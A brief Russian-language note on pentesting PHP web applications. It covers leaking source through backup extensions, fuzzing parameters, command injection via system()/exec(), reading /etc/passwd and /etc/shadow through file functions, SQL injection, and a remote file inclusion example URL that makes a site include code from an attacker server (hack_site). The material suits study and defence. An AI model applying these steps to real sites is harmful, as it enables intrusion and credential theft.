### Сбор информации
При обращении к файлу с раширением .php он выполняется интерпретатором и исходный код увидеть не получится, при этом, емли переименовать файл на другое расширение (например old или bak), то можно опоробовать открыть или скачать файл.
  Элементы кода которым стоит обратить внимание:
  - коментарии
  - скрытые формы и параметры: могут передаваться с парамтерами GET или POST и содержать важную инфу.
  
  После сбора инфы начинается проверка сценариев на корретность обработки входных данных. Для этого во всех параметрах передается "мусор" (- _ : / \ и тд) Если на какой-то символ сценарий выдал ошибку это говорит о том, что символ обрабатывается неверно и необходимо исследовать этот момент.
    Наиболее критичные:
     - функции обращения к системе, например: system() , exec() и тд. Если при обращении к этим функциям не происходит проверка на спец символы, то пробовать выполнить системные команды (pwd, ls и тд)
     - функции работы с файлами, например include(), readfile() и тд. К примеру попробовать прочитать конфигурационные файлы (/etc/passwd  /etc/shadow)
     - SQL-запросы. Нарушить работоспособность БД, получить доступ к конфиденциальной информации.
     
Основная уязвимость сценариев - отсутствие проверки корректности параметров и данных, получаемых от пользователя.

 <ins>сценарий фильтрует спец символы и программно подставляет раширение файла news.php</ins>
 - создать на своем серваке файл, например http://hack_site/hack.news.php
 - передать этот файл как параметр: http://site.name/index.php?file=http://hack_site/hack.news.php
 - если файл подключается сценарием include() или require() , то будет исполнен.
